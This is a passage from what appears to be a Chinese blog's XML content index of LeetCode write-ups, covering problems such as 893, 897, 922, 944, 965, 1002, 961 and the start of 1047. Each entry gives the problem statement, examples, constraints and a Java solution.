class="keyword">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                sb.append(c);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Integer.parseInt(sb.toString());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Stack</tag>
      </tags>
  </entry>
  <entry>
    <title>893. 特殊等价字符串组</title>
    <url>/2020/04/17/LeetCode/leetcode-000893.%20%E7%89%B9%E6%AE%8A%E7%AD%89%E4%BB%B7%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%BB%84/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>你将得到一个字符串数组 A。</p>
<p>如果经过任意次数的移动，S == T，那么两个字符串 S 和 T 是特殊等价的。</p>
<p>一次移动包括选择两个索引 i 和 j，且 i ％ 2 == j ％ 2，交换 S[j] 和 S [i]。</p>
<p>现在规定，A 中的特殊等价字符串组是 A 的非空子集 S，这样不在 S 中的任何字符串与 S 中的任何字符串都不是特殊等价的。</p>
<p>返回 A 中特殊等价字符串组的数量。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;a&quot;,&quot;c&quot;,&quot;c&quot;]</span><br><span class="line">输出：3</span><br><span class="line">解释：3 组 [&quot;a&quot;,&quot;a&quot;]，[&quot;b&quot;]，[&quot;c&quot;,&quot;c&quot;,&quot;c&quot;]</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[&quot;aa&quot;,&quot;bb&quot;,&quot;ab&quot;,&quot;ba&quot;]</span><br><span class="line">输出：4</span><br><span class="line">解释：4 组 [&quot;aa&quot;]，[&quot;bb&quot;]，[&quot;ab&quot;]，[&quot;ba&quot;]</span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[&quot;abc&quot;,&quot;acb&quot;,&quot;bac&quot;,&quot;bca&quot;,&quot;cab&quot;,&quot;cba&quot;]</span><br><span class="line">输出：3</span><br><span class="line">解释：3 组 [&quot;abc&quot;,&quot;cba&quot;]，[&quot;acb&quot;,&quot;bca&quot;]，[&quot;bac&quot;,&quot;cab&quot;]</span><br></pre></td></tr></table></figure>

<h2 id="示例4："><a href="#示例4：" class="headerlink" title="示例4："></a>示例4：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[&quot;abcd&quot;,&quot;cdab&quot;,&quot;adcb&quot;,&quot;cbad&quot;]</span><br><span class="line">输出：1</span><br><span class="line">解释：1 组 [&quot;abcd&quot;,&quot;cdab&quot;,&quot;adcb&quot;,&quot;cbad&quot;]</span><br></pre></td></tr></table></figure>



<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li>1 &lt;= A.length &lt;= 1000</li>
<li>1 &lt;= A[i].length &lt;= 20</li>
<li>所有 A[i] 都具有相同的长度。</li>
<li>所有 A[i] 都只由小写字母组成。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>两个字符串，奇数索引上的元素和偶数索引上的元素分别排序以后相同说明这两个字符串是一组的，然后求这样的组一共有多少个</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numSpecialEquivGroups</span><span class="params">(String[] A)</span> </span>&#123;</span><br><span class="line">        Set&lt;String&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (String s : A) &#123;</span><br><span class="line">            <span class="keyword">char</span>[] chars = s.toCharArray();</span><br><span class="line">            List&lt;Character&gt; odd = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">            List&lt;Character&gt; even = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; chars.length; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">                    odd.add(chars[i]);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    even.add(chars[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            Collections.sort(odd);</span><br><span class="line">            Collections.sort(even);</span><br><span class="line">            StringBuilder builder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            builder.append(odd);</span><br><span class="line">            builder.append(even);</span><br><span class="line">            set.add(builder.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> set.size();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>897. 递增顺序查找树</title>
    <url>/2020/04/17/LeetCode/leetcode-000897.%20%E9%80%92%E5%A2%9E%E9%A1%BA%E5%BA%8F%E6%9F%A5%E6%89%BE%E6%A0%91/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你一个树，请你 <strong>按中序遍历</strong> 重新排列树，使树中最左边的结点现在是树的根，并且每个结点没有左子结点，只有一个右子结点。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[5,3,6,2,4,null,8,1,null,null,null,7,9]</span><br><span class="line"></span><br><span class="line">       5</span><br><span class="line">      &#x2F; \</span><br><span class="line">    3    6</span><br><span class="line">   &#x2F; \    \</span><br><span class="line">  2   4    8</span><br><span class="line"> &#x2F;        &#x2F; \ </span><br><span class="line">1        7   9</span><br><span class="line"></span><br><span class="line">输出：[1,null,2,null,3,null,4,null,5,null,6,null,7,null,8,null,9]</span><br><span class="line"></span><br><span class="line"> 1</span><br><span class="line">  \</span><br><span class="line">   2</span><br><span class="line">    \</span><br><span class="line">     3</span><br><span class="line">      \</span><br><span class="line">       4</span><br><span class="line">        \</span><br><span class="line">         5</span><br><span class="line">          \</span><br><span class="line">           6</span><br><span class="line">            \</span><br><span class="line">             7</span><br><span class="line">              \</span><br><span class="line">               8</span><br><span class="line">                \</span><br><span class="line">                 9</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li>给定树中的结点数介于 <code>1</code> 和 <code>100</code> 之间。</li>
<li>每个结点都有一个从 <code>0</code> 到 <code>1000</code> 范围内的唯一整数值。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>递归</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">increasingBST</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> increasingBST(root, <span class="keyword">null</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> TreeNode <span class="title">increasingBST</span><span class="params">(TreeNode root, TreeNode tail)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> tail;</span><br><span class="line">       TreeNode res = increasingBST(root.left, root);</span><br><span class="line">       root.left = <span class="keyword">null</span>;</span><br><span class="line">       root.right = increasingBST(root.right, tail);</span><br><span class="line">       <span class="keyword">return</span> res;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>二叉树</tag>
        <tag>递归</tag>
      </tags>
  </entry>
  <entry>
    <title>922. 按奇偶排序数组 II</title>
    <url>/2020/04/17/LeetCode/leetcode-000922.%20%E6%8C%89%E5%A5%87%E5%81%B6%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84%20II/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个非负整数数组 A， A 中一半整数是奇数，一半整数是偶数。</p>
<p>对数组进行排序，以便当 A[i] 为奇数时，i 也是奇数；当 A[i] 为偶数时， i 也是偶数。</p>
<p>你可以返回任何满足上述条件的数组作为答案。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[4,2,5,7]</span><br><span class="line">输出：[4,5,2,7]</span><br><span class="line">解释：[4,7,2,5]，[2,5,4,7]，[2,7,4,5] 也会被接受。</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li><code>2 &lt;= A.length &lt;= 20000</code></li>
<li><code>A.length % 2 == 0</code></li>
<li><code>0 &lt;= A[i] &lt;= 1000</code></li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>双指针</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] sortArrayByParityII(<span class="keyword">int</span>[] A) &#123;</span><br><span class="line">        <span class="keyword">int</span> odd = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> even = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (odd &lt; A.length &amp;&amp; even &lt; A.length) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">1</span> == A[odd] % <span class="number">2</span> || <span class="number">0</span> == A[even] % <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="number">1</span> == A[odd] % <span class="number">2</span>) &#123;</span><br><span class="line">                    odd += <span class="number">2</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="number">0</span> == A[even] % <span class="number">2</span>) &#123;</span><br><span class="line">                    even += <span class="number">2</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">int</span> temp = A[even];</span><br><span class="line">                A[even] = A[odd];</span><br><span class="line">                A[odd] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> A;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title>944. 删列造序</title>
    <url>/2020/04/17/LeetCode/leetcode-000944.%20%E5%88%A0%E5%88%97%E9%80%A0%E5%BA%8F/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定由 N 个小写字母字符串组成的数组 A，其中每个字符串长度相等。</p>
<p>删除 操作的定义是：选出一组要删掉的列，删去 A 中对应列中的所有字符，形式上，第 n 列为 [A[0][n], A[1][n], …, A[A.length-1][n]]）。</p>
<p>比如，有 A = [“abcdef”, “uvwxyz”]，</p>
<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2019/07/06/944_1.png" alt></p>
<p>要删掉的列为 <code>{0, 2, 3}</code>，删除后 <code>A</code> 为<code>[&quot;bef&quot;, &quot;vyz&quot;]</code>， <code>A</code> 的列分别为<code>[&quot;b&quot;,&quot;v&quot;], [&quot;e&quot;,&quot;y&quot;], [&quot;f&quot;,&quot;z&quot;]</code>。</p>
<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2019/07/06/944_2.png" alt></p>
<p>你需要选出一组要删掉的列 <code>D</code>，对 <code>A</code> 执行删除操作，使 <code>A</code> 中剩余的每一列都是 <strong>非降序</strong> 排列的，然后请你返回 <code>D.length</code> 的最小可能值。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[&quot;cba&quot;, &quot;daf&quot;, &quot;ghi&quot;]</span><br><span class="line">输出：1</span><br><span class="line">解释：</span><br><span class="line">当选择 D &#x3D; &#123;1&#125;，删除后 A 的列为：[&quot;c&quot;,&quot;d&quot;,&quot;g&quot;] 和 [&quot;a&quot;,&quot;f&quot;,&quot;i&quot;]，均为非降序排列。</span><br><span class="line">若选择 D &#x3D; &#123;&#125;，那么 A 的列 [&quot;b&quot;,&quot;a&quot;,&quot;h&quot;] 就不是非降序排列了。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[&quot;a&quot;, &quot;b&quot;]</span><br><span class="line">输出：0</span><br><span class="line">解释：D &#x3D; &#123;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[&quot;zyx&quot;, &quot;wvu&quot;, &quot;tsr&quot;]</span><br><span class="line">输出：3</span><br><span class="line">解释：D &#x3D; &#123;0, 1, 2&#125;</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li><code>1 &lt;= A.length &lt;= 100</code></li>
<li><code>1 &lt;= A[i].length &lt;= 1000</code></li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>对于每一列，我们检查它是否是有序的。如果它有序，则将答案增加 1，否则它必须被删除。</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minDeletionSize</span><span class="params">(String[] A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> c = <span class="number">0</span>; c &lt; A[<span class="number">0</span>].length(); ++c)</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> r = <span class="number">0</span>; r &lt; A.length - <span class="number">1</span>; ++r)</span><br><span class="line">                <span class="keyword">if</span> (A[r].charAt(c) &gt; A[r+<span class="number">1</span>].charAt(c)) &#123;</span><br><span class="line">                    ans++;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>965. 单值二叉树</title>
    <url>/2020/04/17/LeetCode/leetcode-000965.%20%E5%8D%95%E5%80%BC%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>如果二叉树每个节点都具有相同的值，那么该二叉树就是<em>单值</em>二叉树。</p>
<p>只有给定的树是单值二叉树时，才返回 <code>true</code>；否则返回 <code>false</code>。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/29/screen-shot-2018-12-25-at-50104-pm.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[1,1,1,1,1,null,1]</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/29/screen-shot-2018-12-25-at-50050-pm.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[2,2,2,5,2]</span><br><span class="line">输出：false</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li>给定树的节点数范围是 <code>[1, 100]</code>。</li>
<li>每个节点的值都是整数，范围为 <code>[0, 99]</code> 。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>递归</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isUnivalTree</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> == root) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> != root.right &amp;&amp; root.right.val != root.val) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> != root.left &amp;&amp; root.left.val != root.val) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> isUnivalTree(root.right) &amp;&amp; isUnivalTree(root.left);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>二叉树</tag>
        <tag>递归</tag>
      </tags>
  </entry>
  <entry>
    <title>1002. 查找常用字符</title>
    <url>/2020/04/17/LeetCode/leetcode-001002.%20%E6%9F%A5%E6%89%BE%E5%B8%B8%E7%94%A8%E5%AD%97%E7%AC%A6/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定仅有小写字母组成的字符串数组 A，返回列表中的每个字符串中都显示的全部字符（包括重复字符）组成的列表。例如，如果一个字符在每个字符串中出现 3 次，但不是 4 次，则需要在最终答案中包含该字符 3 次。</p>
<p>你可以按任意顺序返回答案。</p>
<h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[&quot;bella&quot;,&quot;label&quot;,&quot;roller&quot;]</span><br><span class="line">输出：[&quot;e&quot;,&quot;l&quot;,&quot;l&quot;]</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[&quot;cool&quot;,&quot;lock&quot;,&quot;cook&quot;]</span><br><span class="line">输出：[&quot;c&quot;,&quot;o&quot;]</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li><code>1 &lt;= A.length &lt;= 100</code></li>
<li><code>1 &lt;= A[i].length &lt;= 100</code></li>
<li><code>A[i][j]</code> 是小写字母</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>借助HashMap，保存字符，次数，然后求每个的交集即可。</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">commonChars</span><span class="params">(String[] A)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">null</span> == A || <span class="number">0</span> == A.length || <span class="number">1</span> == A.length) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span>[] hash = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">26</span>];</span><br><span class="line">		<span class="keyword">boolean</span> firstFlag = <span class="keyword">true</span>;</span><br><span class="line">		<span class="keyword">for</span> (String word : A) &#123;</span><br><span class="line">			<span class="keyword">char</span>[] wordChars = word.toCharArray();</span><br><span class="line">			<span class="keyword">if</span> (firstFlag) &#123;</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">char</span> wordChar : wordChars) &#123;</span><br><span class="line">					hash[wordChar - <span class="number">97</span>]++;</span><br><span class="line">				&#125;</span><br><span class="line">				firstFlag = <span class="keyword">false</span>;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">int</span>[] tmpHash = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">26</span>];</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">char</span> wordChar : wordChars) &#123;</span><br><span class="line">					tmpHash[wordChar - <span class="number">97</span>]++;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; hash.length; ++i) &#123;</span><br><span class="line">					<span class="keyword">if</span> (hash[i] &gt; tmpHash[i]) &#123;</span><br><span class="line">						hash[i] = tmpHash[i];</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		List&lt;String&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; hash.length; ++i) &#123;</span><br><span class="line">			<span class="keyword">if</span> (hash[i] != <span class="number">0</span>) &#123;</span><br><span class="line">				String tmp = String.valueOf((<span class="keyword">char</span>) (i + <span class="number">97</span>));</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; hash[i]; ++j) &#123;</span><br><span class="line">					res.add(tmp);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> res;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>961. 重复 N 次的元素</title>
    <url>/2020/04/17/LeetCode/leetcode-000961.%20%E9%87%8D%E5%A4%8D%20N%20%E6%AC%A1%E7%9A%84%E5%85%83%E7%B4%A0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>在大小为 <code>2N</code> 的数组 <code>A</code> 中有 <code>N+1</code> 个不同的元素，其中有一个元素重复了 <code>N</code> 次。</p>
<p>返回重复了 <code>N</code> 次的那个元素。</p>
<h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[1,2,3,3]</span><br><span class="line">输出：3</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[2,1,2,5,3,2]</span><br><span class="line">输出：2</span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[5,1,5,2,5,3,5,4]</span><br><span class="line">输出：5</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li><code>4 &lt;= A.length &lt;= 10000</code></li>
<li><code>0 &lt;= A[i] &lt; 10000</code></li>
<li><code>A.length</code> 为偶数</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>借助HashMap</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">repeatedNTimes</span><span class="params">(<span class="keyword">int</span>[] A)</span> </span>&#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> a : A) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (map.containsKey(a)) &#123;</span><br><span class="line">        		<span class="keyword">if</span> (map.get(a) + <span class="number">1</span> == A.length / <span class="number">2</span>) &#123;</span><br><span class="line">        			<span class="keyword">return</span> a;</span><br><span class="line">        		&#125;</span><br><span class="line">        		map.replace(a, map.get(a) + <span class="number">1</span>);</span><br><span class="line">        	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        		map.put(a, <span class="number">1</span>);</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>比较</p>
<p>一旦找到一个重复元素，那么一定就是答案。我们称这个答案为主要元素。</p>
<p>考虑所有长度为 4 的子序列，在子序列中一定至少含有两个主要元素。</p>
<p>这是因为：</p>
<ul>
<li>长度为 2 的子序列中都是主要元素，或者；</li>
<li>每个长度为 2 的子序列都恰好含有 1 个主要元素，这意味着长度为 4 的子序列一定含有 2 个主要元素。</li>
</ul>
<p>因此，只需要比较所有距离为 1，2 或者 3 的邻居元素即可。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">repeatedNTimes</span><span class="params">(<span class="keyword">int</span>[] A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">1</span>; k &lt;= <span class="number">3</span>; ++k)</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.length - k; ++i)</span><br><span class="line">                <span class="keyword">if</span> (A[i] == A[i+k])</span><br><span class="line">                    <span class="keyword">return</span> A[i];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>1047. 删除字符串中的所有相邻重复项</title>
    <url>/2020/04/17/LeetCode/leetcode-001047.%20%E5%88%A0%E9%99%A4%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89%E7%9B%B8%E9%82%BB%E9%87%8D%E5%A4%8D%E9%A1%B9/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给出由小写字母组成的字符串 S，重复项删除操作会选择两个相邻且相同的字母，并删除它们。</p>
<p>在 S 上反复执行重复项删除操作，直到无法继续删除。</p>
<p>在完成所有重复项删除操作后返回最终的字符串。答案保证唯一。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：&quot;abbaca&quot;</span><br><span class="line">输出：&quot;ca&quot;</span><br><span class="line">解释：</span><br><span class="line">例如，在 &quot;abbaca&quot; 中，我们可以删除 &quot;bb&quot; 由于两字母相邻且相同，这是此时唯一可以执行删除操作的重复项。之后我们得到字符串 &quot;aaca&quot;，其中又只有 &quot;aa&quot; 可以执行重复项删除操作，所以最后的字符串为 &quot;ca&quot;。</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li><code>1 &lt;= S.length &lt;= 20000</code></li>
<li><code>S</code> 仅由小写英文字母组成。</li>
